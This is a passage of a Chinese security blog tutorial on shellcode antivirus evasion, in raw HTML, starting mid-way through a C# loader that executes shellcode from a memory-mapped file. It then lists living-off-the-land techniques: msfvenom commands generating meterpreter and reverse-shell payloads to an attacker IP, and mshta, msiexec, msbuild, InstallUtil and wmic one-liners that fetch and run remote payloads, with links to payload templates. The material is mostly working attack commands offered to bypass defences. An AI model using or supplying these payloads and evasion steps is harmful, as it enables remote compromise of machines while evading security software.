!important;"><span class="code-snippet_outer">               viewaccessor.<span style="color: rgb(0, 134, 179);">SafeMemoryMappedViewHandle</span>.<span style="color: rgb(0, 134, 179);">AcquirePointer</span>(<span style="color: rgb(167, 29, 93);">ref</span> pointer);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(167, 29, 93);">var</span> func = (<span style="color: rgb(0, 134, 179);">NewDelegate</span>)<span style="color: rgb(0, 134, 179);">Marshal</span>.<span style="color: rgb(0, 134, 179);">GetDelegateForFunctionPointer</span>(<span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(0, 134, 179);">IntPtr</span>(pointer), <span style="color: rgb(167, 29, 93);">typeof</span>(<span style="color: rgb(0, 134, 179);">NewDelegate</span>));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(167, 29, 93);">return</span> func();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(167, 29, 93);">catch</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(167, 29, 93);">return</span> <span style="color: rgb(0, 134, 179);">IntPtr</span>.<span style="color: rgb(0, 134, 179);">Zero</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(167, 29, 93);">finally</span> <span style="color: rgb(150, 152, 150);">// You should always clean up after yourself :)</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               viewaccessor.<span style="color: rgb(0, 134, 179);">Dispose</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               mmf.<span style="color: rgb(0, 134, 179);">Dispose</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">void</span> <span style="color: rgb(0, 134, 179);">Main</span>(<span style="color: rgb(167, 29, 93);">string</span>[] args)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(0, 134, 179);">GetShellMemAddr</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code></pre></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -p windows/x64/<span style="color: rgb(167, 29, 93);">exec</span> CMD=<span style="color: rgb(24, 54, 145);">"cmd.exe -c calc.exe"</span> -f csharp</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Invoke</span>-<span style="color: rgb(0, 134, 179);">MMFml</span></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="36" data-backw="319" data-ratio="0.11192214111922141" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/10_su7LnqysibktkicLqfewF7U9vcNrsQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkiabnoAZe0yhXjicjfYWmQptVMOrKsu7LnqysibktkicLqfewF7U9vcNrsQ/640?wx_fmt=png'" data-type="png" data-w="411" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><hr style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;border-style: solid;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgba(0, 0, 0, 0.1);transform-origin: 0px 0px;transform: scale(1, 0.5);"  /><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">加载器就到这里吧，加载器的实现有能力可以自己造轮子，免杀效果非常不错的。</p><h2 style="margin: 4em auto 2em;padding-right: 0.2em;padding-left: 0.2em;font-weight: bold;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.4px;display: table;background: rgb(0, 152, 116);">B)Lolbins白利用加载shellcode</a></h2><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">除了加载器这种"杯子和水"的分离的思想，个人认为还具有"分离"免杀思想的就是Lolbins，也就是白名单。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">下面例举一些白利用，这种分离多半是因为杀行为特征，比如你这个程序运行上下文不应该访问某个api，这种就会被捕获，而白利用就是绕过这种行为捕获，而这种白利用中有的shellcode或执行文件还是会落地被查杀，这个文后部分会提到，先来看白利用。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">LOLBins，全称“Living-Off-the-Land Binaries”，直白翻译为“生活在陆地上的二进制“，这个概念最初在2013年DerbyCon黑客大会由Christopher Campbell和Matt Graeber进行创造，最终Philip Goh提出了LOLBins这个概念。说白了就是白利用 ，举个例子</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">DarkHydrus APT样本</h4><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">MD5：B108412F1CDC0602D82D3E6B318DC634</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用到的启动命令：cscript.exe “C:\Users\Public\Documents\ OfficeUpdateService.vbs”</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里就用了cscript加载vbs 添加开机启动项，启动脚本。</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">mshta：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">payload:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.134</span> LPORT=<span style="color: rgb(0, 134, 179);">53</span> -f raw &gt; shellcode.bin</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">cat shellcode.bin |base64 -w <span style="color: rgb(0, 134, 179);">0</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">mshta.exe [url]http:<span style="color: rgb(150, 152, 150);">//192.168.174.134[/url] /qing.hta</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">替换模板:</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">shellcode替换位置:</p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="66" data-backw="319" data-ratio="0.20611916264090177" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/11_2EibqWvM2LqXaLLxYKBJPv4YRiaVng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAk1rghgaK8KhQ3XvIoQr2a0w644f2EibqWvM2LqXaLLxYKBJPv4YRiaVng/640?wx_fmt=png'" data-type="png" data-w="1863" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Msiexec:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -p windows/x64/shell/reverse_tcp LHOST=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.134</span> LPORT=<span style="color: rgb(0, 134, 179);">4444</span> - f msi &gt; qing.txt</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\Windows\System32\msiexec.exe /q /i [url]http:<span style="color: rgb(150, 152, 150);">//192.168.174.134[/url] /qing.txt</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">加载dll:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -p windows/x64/shell/reverse_tcp LHOST=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.134</span> LPORT=<span style="color: rgb(0, 134, 179);">53</span> - f dll &gt; qing.dll</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msiexec /y C:\qing.dll</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Msbuild：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\Windows\Microsoft.NET\Framework\v<span style="color: rgb(0, 134, 179);">4.0</span>.<span style="color: rgb(0, 134, 179);">30319</span>\msbuild.exe qing.xml</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">模板用三好师傅的：https://github.com/3gstudent/msbuild-inline-task</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><img data-backh="283" data-backw="319" data-ratio="0.8894792773645058" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/12_SLzDEK1AUuZG9Q0iaEc0ZALV0ekKOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkUIxbzjuicedvqZ1c5zyMFVUwhJSLzDEK1AUuZG9Q0iaEc0ZALV0ekKOg/640?wx_fmt=png'" data-type="png" data-w="941" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;" title="null"  /></p><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Installutil</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">编译:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\Windows\Microsoft.NET\Framework64\v<span style="color: rgb(0, 134, 179);">4.0</span>.<span style="color: rgb(0, 134, 179);">30319</span>\csc.exe /r:<span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Ente</span> rpriseServices.dll /r:<span style="color: rgb(0, 134, 179);">System</span>.IO.<span style="color: rgb(0, 134, 179);">Compression</span>.dll /target:library /<span style="color: rgb(167, 29, 93);">out</span>:qing.exe /keyfile:C:\Users\John\Desktop\installutil.snk /<span style="color: rgb(167, 29, 93);">unsafe</span> C:\Users\John\Desktop\installutil.cs</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">执行:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\Windows\Microsoft.NET\Framework64\v<span style="color: rgb(0, 134, 179);">4.0</span>.<span style="color: rgb(0, 134, 179);">30319</span>\InstallUtil.exe /logfile= <span style="color: rgb(24, 54, 145);">/LogToConsole=false /</span>U qing.exe</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">详细:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[url]https:<span style="color: rgb(150, 152, 150);">//www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/[/url]</span></span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">wmic:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">wmic os <span style="color: rgb(167, 29, 93);">get</span> /FORMAT:<span style="color: rgb(24, 54, 145);">"http://example.com/evil.xsl"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">模板:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">https:<span style="color: rgb(150, 152, 150);">//raw.githubusercontent.com/kmkz/Sources/master/wmic-poc.xsl</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">csc:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, 